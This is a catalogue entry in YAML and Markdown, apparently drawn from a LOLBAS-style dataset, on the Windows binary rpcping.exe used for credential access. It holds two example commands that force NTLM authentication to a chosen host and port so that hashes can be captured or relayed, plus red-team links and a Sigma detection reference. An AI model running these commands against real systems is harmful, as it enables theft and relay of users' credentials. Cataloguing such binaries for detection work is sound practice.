---
id: windows-credential-rpcping
namespace: windows:credential:rpcping
name: rpcping
description: 'Used to verify rpc connection Located at: C:\Windows\System32\rpcping.exe;
  C:\Windows\SysWOW64\rpcping.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- credential.dump
platforms:
- windows
risk_level: critical
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- rpcping
parameters: []
features:
- file-system
- network-intensive
- pipes-stdin
- pipes-stdout
- remote
execution:
  template: rpcping
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Send a RPC test connection to the target server (-s) and force the
    NTLM hash to be sent in the process. (Capture credentials on a non-standard port)
  command: rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
- description: Trigger an authenticated RPC call to the target server (/s) that could
    be relayed to a privileged resource (Sign not Set). (Relay a NTLM authentication
    over RPC (ncacn_ip_tcp) on a custom port)
  command: rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM
references:
- label: RedTips
  url: https://github.com/vysec/RedTips
- label: '974806438316072960'
  url: https://twitter.com/vysecurity/status/974806438316072960
- label: '873181705024266241'
  url: https://twitter.com/vysecurity/status/873181705024266241
- label: '1421144623678988298'
  url: https://twitter.com/splinter_code/status/1421144623678988298
techniques:
- credential-access
mitre_ids:
- T1003
- T1187
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_rpcping_credential_capture.yml
install:
- method: choco
  package_name: rpcping
  commands:
  - choco install rpcping
---

# rpcping

rpcping is a Windows LOLBin. Used to verify rpc connection Located at: C:\Windows\System32\rpcping.exe; C:\Windows\SysWOW64\rpcping.exe.
